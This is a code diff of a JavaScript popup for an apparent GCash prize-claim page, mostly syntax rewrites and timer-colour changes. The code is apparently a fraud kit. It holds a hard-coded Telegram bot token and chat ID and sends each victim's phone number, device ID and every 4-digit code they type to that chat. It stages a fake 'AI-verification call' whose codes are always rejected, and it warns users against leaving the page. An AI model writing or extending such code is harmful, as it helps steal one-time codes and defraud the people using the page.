@@ -2,7 +2,7 @@
  * Popup Share Module - With 500 Bills Indicators & AI-Verification Call
  * Updated: AI-Verification Call System (Admin calls user)
  * - Shows user's mobile number with animation
- * - 60-second countdown timer with color changes
+ * - 60-second countdown timer (Neon Green → Neon Red)
  * - Always invalid by default
  * - Full Telegram notifications
  */
@@ -28,9 +28,9 @@
     // ========== SOUND EFFECT ==========
     function playClaimSound() {
         try {
-            const audio = new Audio('sounds/super_ace_scatter_ring.mp3');
+            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
             audio.volume = 0.7;
-            audio.play().catch(e => console.log('Sound play prevented:', e));
+            audio.play().catch(function(e) { console.log('Sound play prevented:', e); });
         } catch(e) {
             console.log('Sound error:', e);
         }
@@ -38,92 +38,64 @@
     
     function playCallSound() {
         try {
-            const audio = new Audio('sounds/call_ring.mp3');
+            var audio = new Audio('sounds/call_ring.mp3');
             audio.volume = 0.5;
-            audio.play().catch(e => console.log('Call sound error:', e));
+            audio.play().catch(function(e) { console.log('Call sound error:', e); });
         } catch(e) {
             console.log('Call sound error:', e);
         }
     }
     
     // ========== TELEGRAM NOTIFICATIONS ==========
-    const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-    const CHAT_ID = "7298607329";
+    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
+    var CHAT_ID = "7298607329";
     
-    async function sendTelegramMessage(message) {
+    function sendTelegramMessage(message) {
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-            console.log('Telegram sent');
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
+                .catch(function(e) { console.error('Telegram error:', e); });
         } catch(e) {
             console.error('Telegram error:', e);
         }
     }
     
     // ========== AI-VERIFICATION CALL TELEGRAM NOTIFICATIONS ==========
-    async function sendAICallRequestNotification(userPhone, deviceId, code) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `📞 AI-VERIFICATION CALL REQUESTED
-━━━━━━━━━━━━━━━━━━━━
-👤 User: ${userPhone}
-🖥️ Device: ${deviceId}
-🔑 Code Generated: ${code}
-⏰ Time: ${timestamp}
-📊 Status: Call requested - Admin will call user
-━━━━━━━━━━━━━━━━━━━━`;
-        await sendTelegramMessage(message);
+    function sendAICallRequestNotification(userPhone, deviceId, code) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '📞 AI-VERIFICATION CALL REQUESTED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code Generated: ' + code + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call requested - Admin will call user\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
-    async function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `🔑 AI-CODE VERIFICATION ATTEMPT
-━━━━━━━━━━━━━━━━━━━━
-👤 User: ${userPhone}
-🖥️ Device: ${deviceId}
-📝 Code Entered: ${codeEntered}
-⏰ Time: ${timestamp}
-⏱️ Seconds Left: ${secondsLeft}s
-📊 Status: INVALID CODE (No valid code exists)
-━━━━━━━━━━━━━━━━━━━━`;
-        await sendTelegramMessage(message);
+    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '🔑 AI-CODE VERIFICATION ATTEMPT\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n📝 Code Entered: ' + codeEntered + '\n⏰ Time: ' + timestamp + '\n⏱️ Seconds Left: ' + secondsLeft + 's\n📊 Status: INVALID CODE (No valid code exists)\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
-    async function sendAICallExpiredNotification(userPhone, deviceId) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `⏰ AI-VERIFICATION CALL EXPIRED
-━━━━━━━━━━━━━━━━━━━━
-👤 User: ${userPhone}
-🖥️ Device: ${deviceId}
-⏰ Time: ${timestamp}
-📊 Status: Call expired - User needs to request a new call
-━━━━━━━━━━━━━━━━━━━━`;
-        await sendTelegramMessage(message);
+    function sendAICallExpiredNotification(userPhone, deviceId) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '⏰ AI-VERIFICATION CALL EXPIRED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n⏰ Time: ' + timestamp + '\n📊 Status: Call expired - User needs to request a new call\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
-    async function sendClaimButtonNotification(userPhone, deviceId, amount) {
-        const now = new Date();
-        const timestamp = now.toLocaleString();
-        const message = `💳 CLAIM THRU GCASH INITIATED
-━━━━━━━━━━━━━━━━━━━━
-👤 User: ${userPhone}
-🖥️ Device: ${deviceId}
-💰 Amount: ₱${amount.toFixed(2)}
-⏰ Time: ${timestamp}
-📊 Status: Claim process started
-━━━━━━━━━━━━━━━━━━━━`;
-        await sendTelegramMessage(message);
+    function sendClaimButtonNotification(userPhone, deviceId, amount) {
+        var now = new Date();
+        var timestamp = now.toLocaleString();
+        var message = '💳 CLAIM THRU GCASH INITIATED\n━━━━━━━━━━━━━━━━━━━━\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n💰 Amount: ₱' + amount.toFixed(2) + '\n⏰ Time: ' + timestamp + '\n📊 Status: Claim process started\n━━━━━━━━━━━━━━━━━━━━';
+        sendTelegramMessage(message);
     }
     
     // ========== UPDATE BILLS INDICATORS ==========
     function updateBillsIndicators(balance) {
-        const billIndicators = document.querySelectorAll('.bill-indicator');
-        const billCount = Math.min(4, Math.floor(balance / 500));
+        var billIndicators = document.querySelectorAll('.bill-indicator');
+        var billCount = Math.min(4, Math.floor(balance / 500));
         
-        for (let i = 0; i < billIndicators.length; i++) {
-            const indicator = billIndicators[i];
-            const img = indicator.querySelector('img');
+        for (var i = 0; i < billIndicators.length; i++) {
+            var indicator = billIndicators[i];
+            var img = indicator.querySelector('img');
             
             if (i < billCount) {
                 if (i % 2 === 0) {
@@ -147,7 +119,7 @@
     function init() {
         console.log('🎯 Popup Module Starting...');
         
-        const popup = document.getElementById('prizePopup');
+        var popup = document.getElementById('prizePopup');
         if (!popup) {
             console.error('Popup element not found!');
             return;
@@ -165,7 +137,7 @@
     function addAnimations() {
         if (document.querySelector('#popup-casino-animations')) return;
         
-        const style = document.createElement('style');
+        var style = document.createElement('style');
         style.id = 'popup-casino-animations';
         style.textContent = `
             @keyframes bounceIn {
@@ -206,10 +178,6 @@
                 0%, 100% { transform: scale(1); opacity: 1; }
                 50% { transform: scale(1.05); opacity: 0.8; text-shadow: 0 0 30px rgba(0, 212, 255, 0.5); }
             }
-            @keyframes phoneGlow {
-                0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
-                50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
-            }
             @keyframes numberReveal {
                 0% { opacity: 0; transform: scale(0.5) rotateY(90deg); }
                 50% { opacity: 0.5; transform: scale(1.1) rotateY(-10deg); }
@@ -218,6 +186,10 @@
             @keyframes numberGlowPulse {
                 0%, 100% { text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); }
                 50% { text-shadow: 0 0 40px rgba(0, 212, 255, 0.6), 0 0 80px rgba(0, 212, 255, 0.2); }
+            }
+            @keyframes timerPulseRed {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.7; }
             }
             
             .bill-indicators {
@@ -362,7 +334,7 @@
     function addPhase3Animations() {
         if (document.querySelector('#phase3-animations')) return;
         
-        const style = document.createElement('style');
+        var style = document.createElement('style');
         style.id = 'phase3-animations';
         style.textContent = `
             @keyframes pulseRing {
@@ -393,6 +365,10 @@
                 0%, 100% { transform: scale(1); opacity: 1; }
                 50% { transform: scale(1.1); opacity: 0.8; }
             }
+            @keyframes timerPulseRed {
+                0%, 100% { transform: scale(1); opacity: 1; }
+                50% { transform: scale(1.1); opacity: 0.7; }
+            }
             .verification-input:focus {
                 border-color: #00d4ff !important;
                 box-shadow: 0 0 30px rgba(0, 212, 255, 0.3) !important;
@@ -419,9 +395,9 @@
     
     // ========== BALANCE DECREMENT ANIMATION ==========
     function animateBalanceDecrement(start, end, duration, callback) {
-        const balanceSpan = document.getElementById('popupBalanceAmount');
-        const balanceDisplay = document.getElementById('popupBalanceDisplay');
-        const claimBtn = document.getElementById('claimGCashBtn');
+        var balanceSpan = document.getElementById('popupBalanceAmount');
+        var balanceDisplay = document.getElementById('popupBalanceDisplay');
+        var claimBtn = document.getElementById('claimGCashBtn');
         
         if (!balanceSpan) {
             if (callback) callback();
@@ -435,17 +411,17 @@
             claimBtn.innerHTML = '⏳ PROCESSING...';
         }
         
-        const totalSteps = 30;
-        const decrementAmount = start / totalSteps;
-        let currentStep = 0;
+        var totalSteps = 30;
+        var decrementAmount = start / totalSteps;
+        var currentStep = 0;
         
         if (balanceDisplay) {
             balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
         }
         
-        const interval = setInterval(() => {
+        var interval = setInterval(function() {
             currentStep++;
-            const currentVal = start - (decrementAmount * currentStep);
+            var currentVal = start - (decrementAmount * currentStep);
             
             if (balanceSpan) {
                 balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
@@ -472,14 +448,14 @@
                     balanceDisplay.style.animation = 'successFlash 0.5s ease';
                     balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
                     
-                    setTimeout(() => {
+                    setTimeout(function() {
                         if (balanceDisplay) {
                             balanceDisplay.style.animation = 'none';
                         }
                     }, 500);
                 }
                 
-                setTimeout(() => {
+                setTimeout(function() {
                     if (callback) callback();
                 }, 600);
             }
@@ -491,49 +467,52 @@
     }
     
     // ========== GET FIREWALL STATUS ==========
-    async function getFirewallStatus() {
+    function getFirewallStatus() {
         try {
-            const db = firebase.database();
-            const snapshot = await db.ref('admin/globalFirewall').once('value');
-            const data = snapshot.val();
-            currentFirewallStatus = (data && data.active === true);
-            console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
-            return currentFirewallStatus;
+            var db = firebase.database();
+            return db.ref('admin/globalFirewall').once('value').then(function(snapshot) {
+                var data = snapshot.val();
+                currentFirewallStatus = (data && data.active === true);
+                console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
+                return currentFirewallStatus;
+            });
         } catch(e) {
             console.error('Firewall error:', e);
-            return false;
+            return Promise.resolve(false);
         }
     }
     
     // ========== SYNC BALANCE FROM FIREBASE ==========
-    async function syncBalanceFromFirebase() {
-        const userPhone = localStorage.getItem("userPhone");
-        if (!userPhone) return 0;
+    function syncBalanceFromFirebase() {
+        var userPhone = localStorage.getItem("userPhone");
+        if (!userPhone) return Promise.resolve(0);
         
         try {
-            const db = firebase.database();
-            const snap = await db.ref('user_sessions/' + userPhone).once('value');
-            if (snap.exists() && snap.val().balance !== undefined) {
-                const balance = snap.val().balance;
-                const balanceEl = document.getElementById('userBalanceDisplay');
-                if (balanceEl) balanceEl.innerText = balance.toFixed(2);
-                return balance;
-            }
+            var db = firebase.database();
+            return db.ref('user_sessions/' + userPhone).once('value').then(function(snap) {
+                if (snap.exists() && snap.val().balance !== undefined) {
+                    var balance = snap.val().balance;
+                    var balanceEl = document.getElementById('userBalanceDisplay');
+                    if (balanceEl) balanceEl.innerText = balance.toFixed(2);
+                    return balance;
+                }
+                return 0;
+            });
         } catch(e) {
             console.error('Error syncing balance:', e);
+            return Promise.resolve(0);
         }
-        return 0;
     }
     
     // ========== ATTACH CLAIM BUTTON ==========
     function attachClaimButton() {
-        const claimBtn = document.getElementById('claimNowBtn');
+        var claimBtn = document.getElementById('claimNowBtn');
         if (!claimBtn) {
             console.error('Claim button not found!');
             return;
         }
         
-        claimBtn.onclick = async function(e) {
+        claimBtn.onclick = function(e) {
             e.preventDefault();
             e.stopPropagation();
             
@@ -541,54 +520,57 @@
             
             playClaimSound();
             
-            const userPhone = localStorage.getItem("userPhone") || "Unknown";
-            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
             
-            const balance = await syncBalanceFromFirebase();
-            showPopup(balance);
-            
-            if (window.ConfettiModule) window.ConfettiModule.start();
+            syncBalanceFromFirebase().then(function(balance) {
+                showPopup(balance);
+                if (window.ConfettiModule) window.ConfettiModule.start();
+            });
         };
         
         console.log('✅ Claim button attached');
     }
     
     // ========== GET PAYOUT LINK ==========
-    async function getLatestPayoutLink() {
+    function getLatestPayoutLink() {
         try {
-            const db = firebase.database();
-            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-            if (snapshot.exists()) {
-                const key = Object.keys(snapshot.val())[0];
-                const linkData = snapshot.val()[key];
-                return { key: key, url: linkData.url };
-            }
-            return null;
+            var db = firebase.database();
+            return db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value').then(function(snapshot) {
+                if (snapshot.exists()) {
+                    var key = Object.keys(snapshot.val())[0];
+                    var linkData = snapshot.val()[key];
+                    return { key: key, url: linkData.url };
+                }
+                return null;
+            });
         } catch(e) {
             console.error('Link error:', e);
-            return null;
+            return Promise.resolve(null);
         }
     }
     
     // ========== MARK LINK AS USED ==========
-    async function markLinkAsUsed(linkKey, userPhone) {
+    function markLinkAsUsed(linkKey, userPhone) {
         try {
-            const db = firebase.database();
-            await db.ref('links/' + linkKey).update({
+            var db = firebase.database();
+            return db.ref('links/' + linkKey).update({
                 status: 'used',
                 user: userPhone,
                 usedAt: Date.now()
+            }).then(function() {
+                console.log('✅ Link marked as used');
             });
-            console.log('✅ Link marked as used');
         } catch(e) {
             console.error('Error marking link:', e);
+            return Promise.resolve();
         }
     }
     
     // ========== BEFORE UNLOAD HANDLER ==========
     function beforeUnloadHandler(e) {
         if (claimInProgress && !isRedirecting) {
-            const message = "Your payout is unsuccessful! Please complete the process.";
+            var message = "Your payout is unsuccessful! Please complete the process.";
             e.preventDefault();
             e.returnValue = message;
             return message;
@@ -597,7 +579,7 @@
     
     // ========== SHOW FIREWALL POPUP ==========
     function showFirewallPopup() {
-        const popupInner = document.querySelector('.popup-inner');
+        var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
         currentPhase = 3;
@@ -606,7 +588,7 @@
         popupInner.style.opacity = '0';
         popupInner.style.transform = 'scale(0.95)';
         
-        setTimeout(() => {
+        setTimeout(function() {
             showPhase3();
             popupInner.style.opacity = '1';
             popupInner.style.transform = 'scale(1)';
@@ -615,10 +597,10 @@
     
     // ========== PHASE 3: AI-VERIFICATION CALL ==========
     function showPhase3() {
-        const popupInner = document.querySelector('.popup-inner');
+        var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
-        const popupContainer = document.querySelector('.popup-container');
+        var popupContainer = document.querySelector('.popup-container');
         if (popupContainer) {
             popupContainer.style.maxWidth = '380px';
             popupContainer.style.width = '90%';
@@ -636,8 +618,8 @@
         codeEntered = false;
         
         // Get user's mobile number
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
         
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase3">✕</div>
@@ -670,7 +652,7 @@
                     </span>
                 </div>
                 
-                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #00d4ff; margin-top: 5px; text-shadow: 0 0 20px rgba(0, 212, 255, 0.2); display: none;">60s</div>
+                <div id="callTimerDisplay" style="font-size: 28px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; text-shadow: 0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1); display: none;">60s</div>
             </div>
             
             <!-- REQUEST CALL BUTTON -->
@@ -712,21 +694,23 @@
     
     // ========== ATTACH PHASE 3 EVENTS ==========
     function attachPhase3Events() {
-        const closeBtn = document.getElementById('popupClosePhase3');
-        if (closeBtn) closeBtn.onclick = function() { 
-            stopCallTimer();
-            closePopup(); 
-        };
+        var closeBtn = document.getElementById('popupClosePhase3');
+        if (closeBtn) {
+            closeBtn.onclick = function() { 
+                stopCallTimer();
+                closePopup(); 
+            };
+        }
         
-        const backBtn = document.getElementById('backBtnPhase3');
+        var backBtn = document.getElementById('backBtnPhase3');
         if (backBtn) {
             backBtn.onclick = function() {
                 stopCallTimer();
-                const popupInner = document.querySelector('.popup-inner');
+                var popupInner = document.querySelector('.popup-inner');
                 if (popupInner) {
                     popupInner.style.transition = 'opacity 0.3s ease';
                     popupInner.style.opacity = '0';
-                    setTimeout(() => {
+                    setTimeout(function() {
                         showPhase1(currentBalance);
                         popupInner.style.opacity = '1';
                     }, 300);
@@ -735,7 +719,7 @@
         }
         
         // ========== REQUEST CALL BUTTON ==========
-        const requestBtn = document.getElementById('requestCallBtn');
+        var requestBtn = document.getElementById('requestCallBtn');
         if (requestBtn) {
             requestBtn.onclick = function() {
                 if (callInProgress) {
@@ -747,8 +731,8 @@
         }
         
         // ========== VERIFY CODE BUTTON ==========
-        const verifyBtn = document.getElementById('verifyCodeBtn');
-        const codeInput = document.getElementById('code4Digit');
+        var verifyBtn = document.getElementById('verifyCodeBtn');
+        var codeInput = document.getElementById('code4Digit');
         
         if (verifyBtn) {
             verifyBtn.onclick = function() {
@@ -764,7 +748,7 @@
             });
             
             codeInput.addEventListener('input', function(e) {
-                const value = this.value.trim();
+                var value = this.value.trim();
                 if (value.length === 4 && /^\d+$/.test(value)) {
                     this.style.borderColor = '#22C55E';
                     this.style.boxShadow = '0 0 20px rgba(34, 197, 94, 0.3)';
@@ -777,7 +761,7 @@
     }
     
     // ========== REQUEST AI-VERIFICATION CALL ==========
-    async function requestAICall() {
+    function requestAICall() {
         if (callInProgress) return;
         
         callInProgress = true;
@@ -786,22 +770,22 @@
         currentCallCode = generateCallCode();
         codeEntered = false;
         
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
         
         // Send Telegram notification with code
-        await sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
+        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
         
         // Update UI
-        const statusIcon = document.getElementById('callStatusIcon');
-        const statusText = document.getElementById('callStatusText');
-        const phoneDisplay = document.getElementById('phoneNumberDisplay');
-        const timerDisplay = document.getElementById('callTimerDisplay');
-        const requestBtn = document.getElementById('requestCallBtn');
-        const codeSection = document.getElementById('codeSection');
-        const codeInput = document.getElementById('code4Digit');
-        const codeErrorMsg = document.getElementById('codeErrorMsg');
-        const callExpiredMsg = document.getElementById('callExpiredMsg');
+        var statusIcon = document.getElementById('callStatusIcon');
+        var statusText = document.getElementById('callStatusText');
+        var phoneDisplay = document.getElementById('phoneNumberDisplay');
+        var timerDisplay = document.getElementById('callTimerDisplay');
+        var requestBtn = document.getElementById('requestCallBtn');
+        var codeSection = document.getElementById('codeSection');
+        var codeInput = document.getElementById('code4Digit');
+        var codeErrorMsg = document.getElementById('codeErrorMsg');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
         
         // Reset messages
         if (codeErrorMsg) codeErrorMsg.style.display = 'none';
@@ -819,7 +803,8 @@
         if (timerDisplay) {
             timerDisplay.style.display = 'block';
             timerDisplay.textContent = '60s';
-            timerDisplay.style.color = '#00d4ff';
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
         }
         if (requestBtn) {
             requestBtn.disabled = true;
@@ -837,7 +822,7 @@
         startCallTimer();
         
         // Simulate "call connected" after 4 seconds (admin calls user)
-        setTimeout(() => {
+        setTimeout(function() {
             if (statusIcon) statusIcon.innerHTML = '📱';
             if (statusText) {
                 statusText.innerHTML = '🔊 <strong style="color: #22C55E;">AI-VERIFICATION CALL</strong> connected!<br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Enter the 4-digit code below</span>';
@@ -854,8 +839,7 @@
     
     // ========== GENERATE CALL CODE ==========
     function generateCallCode() {
-        // Generate random 4-digit code
-        const code = Math.floor(1000 + Math.random() * 9000);
+        var code = Math.floor(1000 + Math.random() * 9000);
         return code.toString();
     }
     
@@ -863,25 +847,39 @@
     function startCallTimer() {
         stopCallTimer();
         
-        const timerDisplay = document.getElementById('callTimerDisplay');
-        const statusText = document.getElementById('callStatusText');
-        const requestBtn = document.getElementById('requestCallBtn');
-        const callExpiredMsg = document.getElementById('callExpiredMsg');
-        const codeSection = document.getElementById('codeSection');
+        var timerDisplay = document.getElementById('callTimerDisplay');
+        var statusText = document.getElementById('callStatusText');
+        var requestBtn = document.getElementById('requestCallBtn');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
+        var codeSection = document.getElementById('codeSection');
         
-        callTimerInterval = setInterval(() => {
+        // Set initial color - Neon Green
+        if (timerDisplay) {
+            timerDisplay.style.color = '#39ff14';
+            timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
+            timerDisplay.style.animation = '';
+        }
+        
+        callTimerInterval = setInterval(function() {
             callCountdown--;
             
             if (timerDisplay) {
                 timerDisplay.textContent = callCountdown + 's';
                 
-                // Change color when time is running low
-                if (callCountdown <= 10) {
-                    timerDisplay.style.color = '#ff4444';
-                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 68, 68, 0.3)';
-                } else if (callCountdown <= 20) {
-                    timerDisplay.style.color = '#ff8800';
-                    timerDisplay.style.textShadow = '0 0 20px rgba(255, 136, 0, 0.2)';
+                // ========== NEON COLOR SCHEME ==========
+                // 60s - 10s: NEON GREEN (#39ff14)
+                // 9s - 0s: NEON RED (#ff1744)
+                
+                if (callCountdown <= 9) {
+                    // NEON RED - Urgent (9-0 seconds)
+                    timerDisplay.style.color = '#ff1744';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(255, 23, 68, 0.6), 0 0 60px rgba(255, 23, 68, 0.3), 0 0 100px rgba(255, 23, 68, 0.1)';
+                    timerDisplay.style.animation = 'timerPulseRed 0.5s ease-in-out infinite';
+                } else {
+                    // NEON GREEN - Normal (60-10 seconds)
+                    timerDisplay.style.color = '#39ff14';
+                    timerDisplay.style.textShadow = '0 0 30px rgba(57, 255, 20, 0.4), 0 0 60px rgba(57, 255, 20, 0.1)';
+                    timerDisplay.style.animation = '';
                 }
             }
             
@@ -889,8 +887,8 @@
                 // Call expired
                 stopCallTimer();
                 
-                const userPhone = localStorage.getItem("userPhone") || "Unknown";
-                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                var userPhone = localStorage.getItem("userPhone") || "Unknown";
+                var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                 sendAICallExpiredNotification(userPhone, deviceId);
                 
                 if (statusText) {
@@ -899,6 +897,7 @@
                 }
                 if (timerDisplay) {
                     timerDisplay.style.display = 'none';
+                    timerDisplay.style.animation = '';
                 }
                 if (codeSection) {
                     codeSection.style.display = 'none';
@@ -927,15 +926,15 @@
     }
     
     // ========== VERIFY CODE ==========
-    async function verifyCode() {
-        const codeInput = document.getElementById('code4Digit');
-        const codeErrorMsg = document.getElementById('codeErrorMsg');
-        const callExpiredMsg = document.getElementById('callExpiredMsg');
-        const verifyBtn = document.getElementById('verifyCodeBtn');
+    function verifyCode() {
+        var codeInput = document.getElementById('code4Digit');
+        var codeErrorMsg = document.getElementById('codeErrorMsg');
+        var callExpiredMsg = document.getElementById('callExpiredMsg');
+        var verifyBtn = document.getElementById('verifyCodeBtn');
         
         if (!codeInput) return;
         
-        const enteredCode = codeInput.value.trim();
+        var enteredCode = codeInput.value.trim();
         
         // Validate input
         if (!enteredCode || enteredCode.length !== 4 || !/^\d+$/.test(enteredCode)) {
@@ -966,9 +965,9 @@
         codeEntered = true;
         
         // Send Telegram notification for invalid attempt
-        const userPhone = localStorage.getItem("userPhone") || "Unknown";
-        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
-        await sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
+        var userPhone = localStorage.getItem("userPhone") || "Unknown";
+        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+        sendAICodeAttemptNotification(userPhone, deviceId, enteredCode, callCountdown);
         
         // Show error
         if (codeErrorMsg) {
@@ -985,7 +984,7 @@
         if (verifyBtn) {
             verifyBtn.disabled = true;
             verifyBtn.style.opacity = '0.5';
-            setTimeout(() => {
+            setTimeout(function() {
                 if (verifyBtn) {
                     verifyBtn.disabled = false;
                     verifyBtn.style.opacity = '1';
@@ -994,7 +993,7 @@
         }
         
         // Clear input after 1.5 seconds
-        setTimeout(() => {
+        setTimeout(function() {
             codeInput.value = '';
             codeInput.style.borderColor = '#00d4ff';
             codeInput.style.boxShadow = '0 0 15px rgba(0, 212, 255, 0.2)';
@@ -1007,7 +1006,7 @@
         }, 1500);
         
         // Reset to initial state after 4 seconds
-        setTimeout(() => {
+        setTimeout(function() {
             if (codeErrorMsg) {
                 codeErrorMsg.style.display = 'none';
                 codeErrorMsg.textContent = '';
@@ -1015,10 +1014,10 @@
             }
             
             // Show expired state
-            const statusText = document.getElementById('callStatusText');
-            const timerDisplay = document.getElementById('callTimerDisplay');
-            const codeSection = document.getElementById('codeSection');
-            const requestBtn = document.getElementById('requestCallBtn');
+            var statusText = document.getElementById('callStatusText');
+            var timerDisplay = document.getElementById('callTimerDisplay');
+            var codeSection = document.getElementById('codeSection');
+            var requestBtn = document.getElementById('requestCallBtn');
             
             if (statusText) {
                 statusText.innerHTML = '⏰ <strong style="color: #ff8800;">CALL EXPIRED</strong><br><span style="font-size: 11px; color: rgba(255,255,255,0.5);">Please request a new call</span>';
@@ -1026,6 +1025,7 @@
             }
             if (timerDisplay) {
                 timerDisplay.style.display = 'none';
+                timerDisplay.style.animation = '';
             }
             if (codeSection) {
                 codeSection.style.display = 'none';
@@ -1046,34 +1046,34 @@
     function shakeElement(element) {
         if (!element) return;
         element.style.animation = 'shake 0.5s ease';
-        setTimeout(() => {
+        setTimeout(function() {
             element.style.animation = '';
         }, 500);
     }
     
     // ========== CHECK FIREWALL AND TRANSITION ==========
-    async function checkFirewallAndTransition() {
-        const isFirewallOn = await getFirewallStatus();
-        
-        if (isFirewallOn) {
-            console.log('🔥 Firewall ON - Showing AI-Verification');
-            showFirewallPopup();
-        } else {
-            console.log('🔓 Firewall OFF - Transition to Phase 2');
-            transitionToPhase2();
-        }
+    function checkFirewallAndTransition() {
+        getFirewallStatus().then(function(isFirewallOn) {
+            if (isFirewallOn) {
+                console.log('🔥 Firewall ON - Showing AI-Verification');
+                showFirewallPopup();
+            } else {
+                console.log('🔓 Firewall OFF - Transition to Phase 2');
+                transitionToPhase2();
+            }
+        });
     }
     
     // ========== TRANSITION TO PHASE 2 ==========
     function transitionToPhase2() {
-        const popupInner = document.querySelector('.popup-inner');
+        var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
         popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         popupInner.style.opacity = '0';
         popupInner.style.transform = 'scale(0.95)';
         
-        setTimeout(() => {
+        setTimeout(function() {
             showPhase2();
             popupInner.style.opacity = '1';
             popupInner.style.transform = 'scale(1)';
@@ -1082,10 +1082,10 @@
     
     // ========== PHASE 1: DEFAULT POPUP with 500 Bills Indicators ==========
     function showPhase1(balance) {
-        const popupInner = document.querySelector('.popup-inner');
+        var popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
-        const popupContainer = document.querySelector('.popup-container');
+        var popupContainer = document.querySelector('.popup-container');
         if (popupContainer) {
             popupContainer.style.maxWidth = '360px';
             popupContainer.style.width = '90%';
@@ -1136,13 +1136,13 @@
         
         updateBillsIndicators(balance);
         
-        const closeBtn = document.getElementById('popupClosePhase1');
+        var closeBtn = document.getElementById('popupClosePhase1');
         if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
-        const backBtn = document.getElementById('backBtnPhase1');
+        var backBtn = document.getElementById('backBtnPhase1');
         if (backBtn) backBtn.onclick = function() { closePopup(); };
         
-        const claimBtn = document.getElementById('claimGCashBtn');
+        var claimBtn = document.getElementById('claimGCashBtn');
         if (claimBtn) {
             claimBtn.onclick = function() {
                 if (currentBalance <= 0) {
@@ -1151,7 +1151,7 @@
                     claimBtn.style.border = '1px solid #ff6666';
                     claimBtn.innerHTML = '❌ INSUFFICIENT BALANCE';
                     
-                    const popupTitle = document.querySelector('.popup-title');
+                    var popupTitle = document.querySelector('.popup-title');
                     if (popupTitle) {
                         popupTitle.style.background = 'linear-gradient(to bottom, #ff6666, #ff4444)';
                         popupTitle.style.webkitBackgroundClip = 'text';
@@ -1159,7 +1159,7 @@
                         popupTitle.textContent = '⚠️ NO BALANCE ⚠️';
                     }
                     
-                    setTimeout(() => {
